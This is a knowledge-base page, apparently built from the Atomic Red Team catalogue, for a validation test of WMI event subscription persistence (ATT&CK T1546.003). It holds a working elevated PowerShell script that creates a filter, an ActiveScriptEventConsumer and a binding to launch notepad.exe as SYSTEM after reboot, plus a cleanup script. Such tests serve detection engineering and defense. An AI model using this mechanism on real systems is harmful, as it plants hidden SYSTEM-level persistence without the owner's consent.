---
atomic_guid: "fecd0dfd-fb55-45fa-a10b-6250272d0832"
title: "Persistence via WMI Event Subscription - ActiveScriptEventConsumer"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.003"
attack_technique_name: "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "fecd0dfd-fb55-45fa-a10b-6250272d0832"
  - "Persistence via WMI Event Subscription - ActiveScriptEventConsumer"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Persistence via WMI Event Subscription - ActiveScriptEventConsumer

Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c

## Metadata

- Atomic GUID: fecd0dfd-fb55-45fa-a10b-6250272d0832
- Technique: T1546.003: Event Triggered Execution: Windows Management Instrumentation Event Subscription
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1546.003/T1546.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.003]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject("Wscript.Shell")
                objws.Run "notepad.exe", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
```

### Cleanup

```powershell
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.yaml)
